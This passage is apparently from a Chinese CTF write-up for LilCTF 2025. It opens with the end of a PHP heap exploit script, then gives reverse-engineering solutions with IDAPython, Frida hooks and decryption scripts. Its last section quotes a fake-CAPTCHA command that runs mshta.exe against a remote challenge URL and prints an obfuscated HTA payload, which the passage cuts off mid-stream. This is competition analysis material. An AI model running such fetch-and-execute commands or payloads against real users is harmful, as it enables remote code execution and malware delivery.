            print(path)
            self.remote.dataio(resource)
            self.remote.include(path)
        except (ConnectionError, ChunkedEncodingError):
            pass
        
        msg_print()
        
        if not self.sleep:
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]")
        elif start + self.sleep <= time.time():
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]")
        else:
            # Wrong heap, maybe? If the exploited suggested others, use them!
            msg_print("    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]")
        
        msg_print()


def compress(data) -> bytes:
    """Returns data suitable for `zlib.inflate`.
    """
    # Remove 2-byte header and 4-byte checksum
    return zlib.compress(data, 9)[2:-4]


def b64(data: bytes, misalign=True) -> bytes:
    payload = base64.encode(data)
    if not misalign and payload.endswith("="):
        raise ValueError(f"Misaligned: {data}")
    return payload.encode()


def compressed_bucket(data: bytes) -> bytes:
    """Returns a chunk of size 0x8000 that, when dechunked, returns the data."""
    return chunked_chunk(data, 0x8000)


def qpe(data: bytes) -> bytes:
    """Emulates quoted-printable-encode.
    """
    return "".join(f"={x:02x}" for x in data).upper().encode()


def ptr_bucket(*ptrs, size=None) -> bytes:
    """Creates a 0x8000 chunk that reveals pointers after every step has been ran."""
    if size is not None:
        assert len(ptrs) * 8 == size
    bucket = b"".join(map(p64, ptrs))
    bucket = qpe(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = compressed_bucket(bucket)

    return bucket


def chunked_chunk(data: bytes, size: int = None) -> bytes:
    """Constructs a chunked representation of the given chunk. If size is given, the
    chunked representation has size `size`.
    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.
    """
    # The caller does not care about the size: let's just add 8, which is more than
    # enough
    if size is None:
        size = len(data) + 8
    keep = len(data) + len(b"\n\n")
    size = f"{len(data):x}".rjust(size - keep, "0")
    return size.encode() + b"\n" + data + b"\n"


@dataclass
class Region:
    """A memory region."""

    start: int
    stop: int
    permissions: str
    path: str
    
    @property
    def size(self) -> int:
        return self.stop - self.start


Exploit()
```

## Reverse

### **obfusheader.h**

程序被混淆的比较严重, 发现xor ,eax, eax; jz ptr+1类型的花指令, 可以通过IDAPython匹配这个格式然后全部nop, 程序的控制流静态稍微会好看一些

```python
import ida_bytes
import ida_kernwin
import idc

def patch_pattern_to_nop():
    pattern = [0x48, 0x31, 0xC0, 0x74, 0x01, 0x00]
    
    start_ea = idc.get_inf_attr(idc.INF_MIN_EA)
    end_ea = idc.get_inf_attr(idc.INF_MAX_EA)
    
    current_ea = start_ea
    count = 0
    
    while current_ea < end_ea:
        match = True
        for i in range(len(pattern)):
            if idc.get_wide_byte(current_ea + i) != pattern[i]:
                match = False
                break
        
        if match:
            for i in range(len(pattern)):
                idc.patch_byte(current_ea + i, 0x90)
            count += 1
            current_ea += len(pattern)
        else:
            current_ea += 1
    
    print(f"Patched {count} occurrences")

if __name__ == "__main__":
    patch_pattern_to_nop()
```

然后还有一些其他的混淆, 函数返回常量干扰IDA数据流分析, 全局变量代替常量等, 后者可以设置data段只读来去除, 前者暂时没找到好的方法, 不过不影响动态分析

根据题目的描述, 可以分析程序的数据流, 找到用户的输入会存放在全局变量0x14003A040的位置, 给这一片内存下内存断点来监控这一段数据的读写, flag的长度通过测试是40个字节, 打完断点后运行走到第一个处理的位置

![](https://assets.bili33.top/img/LilCTF2025-Writeup/75e29dc2-c499-4314-b792-871378258090.png)

```c
unsigned __int64 __fastcall sub_140007842(char *a1, unsigned __int64 a2)
{
  unsigned __int64 result; // rax
  int i; // [rsp+2Ch] [rbp-4h]

  for ( i = 0; ; ++i )
  {
    result = a2 >> 1;
    if ( i >= a2 >> 1 )
      break;
    *(_WORD *)&a1[2 * i] ^= rand();
  }
  return result;
}
```

由于已经在动调了, 要获取这个rand序列只需要获取异或之后的数据和异或之前的数据即可

```python
before_str = "LILCTF{12341234123412341234123412341234}"
after_bytes = [
    0x3A, 0x05, 0xF4, 0x3E, 0x30, 0x01, 0x83, 0x61, 0x95, 0x70, 0xFC, 0x02,
    0xB5, 0x54, 0xE0, 0x58, 0x4C, 0x7F, 0x75, 0x50, 0x56, 0x73, 0x91, 0x3E,
    0x21, 0x7E, 0x9D, 0x4E, 0xCB, 0x12, 0xF4, 0x6D, 0x44, 0x24, 0xAA, 0x44,
    0xCF, 0x32, 0x78, 0x4E
]

before_bytes = before_str.encode('ascii')
rand_sequence = []

for i in range(0, len(before_bytes), 2):
    before_word = before_bytes[i] | (before_bytes[i+1] << 8)
    after_word = after_bytes[i] | (after_bytes[i+1] << 8)
    rand_val = before_word ^ after_word
    rand_sequence.append(rand_val)

verification_bytes = []
for i, rand_val in enumerate(rand_sequence):
    byte_index = i * 2
    before_word = before_bytes[byte_index] | (before_bytes[byte_index+1] << 8)
    re_encrypted_word = before_word ^ rand_val
    verification_bytes.append(re_encrypted_word & 0xFF)
    verification_bytes.append((re_encrypted_word >> 8) & 0xFF)

assert verification_bytes == after_bytes, "Verification failed: rand sequence is incorrect."

print(rand_sequence)
# [19574, 32184, 18276, 20728, 17319, 13256, 26503, 27092, 19582, 24897, 16484, 4005, 19731, 32681, 8697, 23744, 6006, 30110, 509, 13132]
```

![](https://assets.bili33.top/img/LilCTF2025-Writeup/107ebd19-2a35-45c0-ab48-14a91df322b0.png)

继续运行到了第二处加密的位置, 同时会输出encrypt done start compare, 后续就是判断flag是否正确了, 懒得在IDA动调跟, 写了个frida hook memcmp函数获取密文

```javascript
const memcmpPtr = Module.getExportByName("msvcrt.dll", "memcmp");
if (memcmpPtr) {
    Interceptor.attach(memcmpPtr, {
        onEnter: function(args) {
            var size = args[2].toInt32();
            if (size >= 30 && size <= 50) {
                var buf1 = Memory.readByteArray(args[0], size);
                var buf2 = Memory.readByteArray(args[1], size);
                console.log("[" + Array.from(new Uint8Array(buf1)).map(b => "0x" + b.toString(16).toUpperCase()).join(", ") + "]");
                console.log("[" + Array.from(new Uint8Array(buf2)).map(b => "0x" + b.toString(16).toUpperCase()).join(", ") + "]");
            }
        }
    });
} else {
    console.log("[!] memcmp function not found!");
}
//[0x5C, 0xAF, 0xB0, 0x1C, 0xFC, 0xEF, 0xC7, 0x8D, 0x3, 0xCF, 0x34, 0x39, 0x41, 0xBE, 0x47, 0x2D, 0x1C, 0x48, 0xEF, 0x8F, 0x7F, 0xF8, 0xD0, 0xFA, 0xFA, 0x2F, 0x81, 0xFD, 0x73, 0xAA, 0x6, 0x1E, 0xAB, 0x7B, 0x40, 0xEB, 0x67, 0xB9, 0xDF, 0x1B]
```

最终解密脚本

```python
ciphertext = [0x5C, 0xAF, 0xB0, 0x1C, 0xFC, 0xEF, 0xC7, 0x8D, 0x03, 0xCF, 0x34, 0x39, 0x41, 0xBE, 0x47, 0x2D, 0x1C, 0x48, 0xEF, 0x8F, 0x7F, 0xF8, 0xD0, 0xFA, 0xFA, 0x2F, 0x81, 0xFD, 0x73, 0xAA, 0x06, 0x1E, 0xAB, 0x7B, 0x40, 0xEB, 0x67, 0xB9, 0xDF, 0x1B]
rand_sequence = [19574, 32184, 18276, 20728, 17319, 13256, 26503, 27092, 19582, 24897, 16484, 4005, 19731, 32681, 8697, 23744, 6006, 30110, 509, 13132]

step1 = [~byte & 0xFF for byte in ciphertext]
step2 = [((byte & 0xF0) >> 4) | ((byte & 0x0F) << 4) for byte in step1]

result = []
for i in range(0, len(step2), 2):
    encrypted_word = step2[i] | (step2[i+1] << 8)
    original_word = encrypted_word ^ rand_sequence[i // 2]
    result.extend([original_word & 0xFF, (original_word >> 8) & 0xFF])

flag = ''.join(chr(b) for b in result)
print(flag)
# LILCTF{wh@t_ls_D@7@fl0W_C@N_1t_B3_e4teN}
```

### **Oh_My_Uboot**

固件题, ARMv7架构的, 直接上qemu + gdb跑一下

![](https://assets.bili33.top/img/LilCTF2025-Writeup/3623ac59-f349-486e-863e-3bdd80ce411b.png)

![](https://assets.bili33.top/img/LilCTF2025-Writeup/7b44c8f3-01ff-4521-9dd9-f50b876c89cc.png)

直接按continue会要求输入password, IDA打开u-boot文件搜字符串没找到这个字符串, 应该是被加密了

预期使用gdb调试然后看调用栈来定位验证password的地方, 但是调了两个小时也没搞出来, 然后在网上了解了一下u-boot, 发现他启动之后会执行一个死循环, 用来执行shell命令, 于是尝试搜索bootcmd字符串来定位代码

![](https://assets.bili33.top/img/LilCTF2025-Writeup/db7c7128-49e7-4813-b9ce-966c2eb8b446.png)

定位到这里, 这几个函数都没啥用，往上查交叉引用, 可以看到sub_60813F74函数

![](https://assets.bili33.top/img/LilCTF2025-Writeup/015e7818-135d-4507-845a-bace4d128118.png)

![](https://assets.bili33.top/img/LilCTF2025-Writeup/5da0a16b-bf87-416c-aff3-28deef635e60.png)

发现硬编码了一串字符串, 显然加密的 password , 算法也不难, 先 xor 0x72 然后再 base58 编码, 解密逆着来就行

```python
def base58_decode(encoded, charset):
    if not encoded:
        return b''
    num = 0
    base = len(charset)
    for char in encoded:
        num = num * base + charset.index(char)
    decoded = []
    while num > 0:
        num, remainder = divmod(num, 256)
        decoded.insert(0, remainder)
    for char in encoded:
        if char == charset[0]:
            decoded.insert(0, 0)
        else:
            break
    return bytes(decoded)

def decrypt():
    target = "5W2b9PbLE6SIc3WP=X6VbPI0?X@HMEWH;"
    charset = ''.join(chr(i) for i in range(48, 106))
    decoded_bytes = base58_decode(target, charset)
    password = bytes(b ^ 0x72 for b in decoded_bytes).decode('ascii')
    return password

if __name__ == "__main__":
    print(decrypt())
# LILCTF{Ub007_1s_v3ry_ez}
```

![](https://assets.bili33.top/img/LilCTF2025-Writeup/d6ee7f83-32ff-4246-813e-c7d79184d6d0.png)

和猜想一样, 验证完之后就进入死循环，检测命令了

### **Qt_Creator**

![](https://assets.bili33.top/img/LilCTF2025-Writeup/14675df2-6349-4ebd-b0ca-e9d69e212925.png)

直接搜字符串就好了, 然后交叉引用找到关键函数

![](https://assets.bili33.top/img/LilCTF2025-Writeup/9f57f1c3-b67f-45ce-aaab-468993daa824.png)

这是qt的构造函函数, 其他组件也会在这里注册, 找到了密文. 加密函数如下

```c
_DWORD *__thiscall sub_40FFF0(_DWORD *this, int a2, int a3)
{
  _DWORD *v3; // ecx
  int v4; // eax
  _DWORD *v5; // edx
  int v6; // ebx
  int v7; // edi
  __int16 v8; // si
  int v9; // eax
  __int16 v11; // si
  int v12; // eax
  int v13; // [esp+4h] [ebp-38h]
  bool v14; // [esp+8h] [ebp-34h]

  v3 = *(_DWORD **)a3;
  if ( *(int *)(*(_DWORD *)a3 + 4) > 0 )
  {
    v4 = 0;
    v5 = *(_DWORD **)a3;
    do
    {
      v6 = 2 * v4;
      v7 = v4 + 1;
      v8 = *(_WORD *)((char *)v3 + 2 * v4 + v3[3]);
      if ( (v4 & 1) != 0 )
      {
        if ( v4 >= v5[1] )
        {
          LOWORD(v13) = 32;
          QString::resize(a3, v7, v13);
          v5 = *(_DWORD **)a3;
          v3 = *(_DWORD **)a3;
          v9 = *(_DWORD *)(*(_DWORD *)a3 + 12);
        }
        else if ( *v5 > 1u || (v9 = v5[3], v3 = v5, v9 != 16) )
        {
          QString::reallocData((QString *)(v5[1] + 1), 0, v14);
          v5 = *(_DWORD **)a3;
          v9 = *(_DWORD *)(*(_DWORD *)a3 + 12);
          v3 = *(_DWORD **)a3;
        }
        *(_WORD *)((char *)v5 + v6 + v9) = v8 - 1;
      }
      else
      {
        v11 = v8 + 1;
        if ( *v3 > 1u || (v12 = v5[3], v3 = v5, v12 != 16) )
        {
          QString::reallocData((QString *)(v5[1] + 1), 0, v14);
          v5 = *(_DWORD **)a3;
          v12 = *(_DWORD *)(*(_DWORD *)a3 + 12);
          v3 = *(_DWORD **)a3;
        }
        *(_WORD *)((char *)v5 + v6 + v12) = v11;
      }
      v4 = v7;
    }
    while ( v5[1] > v7 );
  }
  *this = v3;
  *(_DWORD *)a3 = QArrayData::shared_null;
  return this;
}
```

直接给出解密脚本

```python
fragments = [
    "KJKDS",
    "GzR6`",
    "bsd5s",
    "1q`0t",
    "^wdsx",
    "`b1mw",
    "2oh4mu|"
]
base_str = "".join(fragments)
flag_chars = []
for i, char in enumerate(base_str):
    char_code = ord(char)
    if i % 2 == 0:
        new_char_code = char_code + 1
    else:
        new_char_code = char_code - 1
    flag_chars.append(chr(new_char_code))
final_flag = "".join(flag_chars)
print(final_flag)
# LILCTF{Q7_cre4t0r_1s_very_c0nv3ni3nt}
```

### **ARM** **ASM**

Android题, 关键逻辑在so的JNI函数里面，难度不大, 加密过程很直观, 直接放解密脚本了

```python
def decrypt_ctf(ciphertext):
    custom_base64 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ3456780129+/"
    
    def custom_base64_decode(s):
        result = bytearray()
        s = s.rstrip('=')
        
        bits = ''
        for c in s:
            if c in custom_base64:
                bits += format(custom_base64.index(c), '06b')
        
        for i in range(0, len(bits) - len(bits) % 8, 8):
            byte_bits = bits[i:i+8]
            if len(byte_bits) == 8:
                result.append(int(byte_bits, 2))
        
        return bytes(result)
    
    encrypted_data = custom_base64_decode(ciphertext)
    data = bytearray(encrypted_data)
    
    for j in range(0, 48, 3):
        data[j] = ((data[j] << 5) | (data[j] >> 3)) & 0xFF
        data[j + 1] = ((data[j + 1] << 1) | (data[j + 1] >> 7)) & 0xFF
    
    t_table = bytes([0xD, 0xE, 0xF, 0xC, 0xB, 0xA, 9, 8, 6, 7, 5, 4, 2, 3, 1, 0])
    
    for i in range(2, -1, -1):
        table = bytearray(t_table)
        
        for prev_i in range(i):
            for k in range(16):
                table[k] ^= prev_i
        
        block = bytearray(data[16 * i:16 * (i + 1)])
        
        for k in range(16):
            block[k] ^= table[k]
        
        original_block = bytearray(16)
        for k in range(16):
            try:
                pos = table.index(k)
                if pos < len(block):
                    original_block[k] = block[pos]
                else:
                    original_block[k] = block[k] if k < len(block) else 0
            except ValueError:
                original_block[k] = block[k] if k < len(block) else 0
        
        data[16 * i:16 * (i + 1)] = original_block
    
    return data.decode('utf-8')

ciphertext = "KRD2c1XRSJL9e0fqCIbiyJrHW1bu0ZnTYJvYw1DM2RzPK1XIQJnN2ZfRMY4So09S"
result = decrypt_ctf(ciphertext)
print(f"Flag: {result}")
```

### **1'M no7 A rO6oT**

复制到win+r的命令

```cmd
powershell . "C:\Windows\System32\mshta.exe" http://challenge.xinshi.fun:41166/Coloringoutomic_Host.mp3 http://challenge.xinshi.fun:41166/Coloringoutomic_Host.mp3
```

用winhex打开这个mp3，发现有script标签

```html
<script>window.resizeTo(0, 0);window.moveTo(-9999, -9999); SK=102;UP=117;tV=110;Fx=99;nI=116;pV=105;wt=111;RV=32;wV=82;Rp=106;kz=81;CX=78;GH=40;PS=70;YO=86;kF=75;PO=113;QF=41;sZ=123;nd=118;Ge=97;sV=114;wl=104;NL=121;Ep=76;uS=98;Lj=103;ST=61;Ix=34;Im=59;Gm=101;YZ=109;Xj=71;Fi=48;dL=60;cX=46;ho=108;jF=43;Gg=100;aV=90;uD=67;Nj=83;US=91;tg=93;vx=45;xv=54;QB=49;WT=125;FT=55;yN=51;ff=44;it=50;NW=53;kX=57;zN=52;Mb=56;Wn=119;sC=65;Yp=88;FF=79;var SxhM = String.fromCharCode(SK,UP,tV,Fx,nI,pV,wt,tV,RV,pV,wt,wV,Rp,kz,CX,GH,PS,YO,kF,PO,QF,sZ,nd,Ge,sV,RV,wt,wl,NL,Ep,uS,Lj,ST,RV,Ix,Ix,Im,SK,wt,sV,RV,GH,nd,Ge,sV,RV,Gm,YZ,Xj,kF,RV,ST,RV,Fi,Im,Gm,YZ,Xj,kF,RV,dL,RV,PS,YO,kF,PO,cX,ho,Gm,tV,Lj,nI,wl,Im,RV,Gm,YZ,Xj,kF,jF,jF,QF,sZ,nd,Ge,sV,RV,tV,Gg,aV,uD,RV,ST,RV,Nj,nI,sV,pV,tV,Lj,cX,SK,sV,wt,YZ,uD,wl,Ge,sV,uD,wt,Gg,Gm,GH,PS,YO,kF,PO,US,Gm,YZ,Xj,kF,tg,RV,vx,RV,xv,Fi,QB,QF,Im,wt,wl,NL,Ep,uS,Lj,RV,ST,RV,wt,wl,NL,Ep,uS,Lj,RV,jF,RV,tV,Gg,aV,uD,WT,sV,Gm,nI,UP,sV,tV,RV,wt,wl,NL,Ep,uS,Lj,WT,Im,nd,Ge,sV,RV,wt,wl,NL,Ep,uS,Lj,RV,ST,RV,pV,wt,wV,Rp,kz,CX,GH,US,FT,QB,yN,ff,RV,FT,QB,it,ff,RV,FT,it,Fi,ff,RV,FT,Fi,it,ff,RV,FT,QB,NW,ff,RV,FT,QB,xv,ff,RV,FT,Fi,NW,ff,RV,FT,Fi,it,ff,RV,FT,Fi,kX,ff,RV,FT,Fi,kX,ff,RV,xv,zN,FT,ff,RV,FT,Fi,it,ff,RV,FT,it,QB,ff,RV,FT,Fi,it,ff,RV,xv,yN,yN,ff,RV,xv,zN,xv,ff,RV,FT,it,Fi,ff,RV,xv,yN,yN,ff,RV,xv,NW,Fi,ff,RV,xv,yN,yN,ff,RV,xv,zN,xv,ff,RV,FT,Fi,it,ff,RV,FT,QB,yN,ff,RV,xv,yN,yN,ff,RV,xv,Mb,xv,ff,RV,FT,QB,QB,ff,RV,FT,QB,NW,ff,RV,FT,Fi,it,ff,RV,FT,QB,xv,ff,RV,FT,QB,FT,ff,RV,FT,QB,NW,ff,RV,FT,Fi,xv,ff,RV,FT,Fi,Fi,ff,RV,FT,QB,FT,ff,RV,FT,Fi,it,ff,RV,FT,Fi,QB,ff,RV,xv,yN,yN,ff,RV,xv,zN,xv,ff,RV,FT,QB,QB,ff,RV,FT,QB,it,ff,RV,FT,QB,yN,ff,RV,xv,yN,yN,ff,RV,xv,yN,FT,ff,RV,xv,FT,Fi,ff,RV,xv,FT,QB,ff,RV,xv,Mb,NW,ff,RV,xv,FT,Fi,ff,RV,xv,yN,yN,ff,RV,xv,xv,it,ff,RV,xv,zN,QB,ff,RV,xv,kX,it,ff,RV,FT,QB,NW,ff,RV,FT,Fi,it,ff,RV,FT,Fi,zN,ff,RV,FT,Fi,it,ff,RV,FT,it,QB,ff,RV,xv,kX,zN,ff,RV,xv,NW,kX,ff,RV,xv,NW,kX,ff,RV,xv,FT,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,QB,FT,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,NW,ff,RV,FT,Fi,it,ff,RV,FT,QB,xv,ff,RV,xv,zN,QB,ff,RV,xv,zN,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,yN,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,Fi,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,FT,Fi,it,ff,RV,FT,Fi,it,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,NW,NW,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,zN,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,NW,Mb,ff,RV,xv,zN,kX,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,zN,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,NW,it,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,NW,FT,ff,RV,xv,NW,Mb,ff,RV,xv,zN,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,kX,ff,RV,xv,kX,kX,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,kX,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,NW,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,QB,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,Fi,ff,RV,xv,NW,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,kX,ff,RV,FT,Fi,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,kX,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,FT,Fi,it,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,kX,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,xv,NW,FT,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,NW,FT,ff,RV,FT,Fi,QB,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,kX,kX,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,kX,kX,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,zN,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,yN,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,zN,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,zN,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,zN,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,zN,kX,ff,RV,FT,Fi,it,ff,RV,FT,Fi,it,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,yN,ff,RV,xv,NW,NW,ff,RV,FT,Fi,it,ff,RV,xv,NW,it,ff,RV,FT,Fi,it,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,yN,ff,RV,x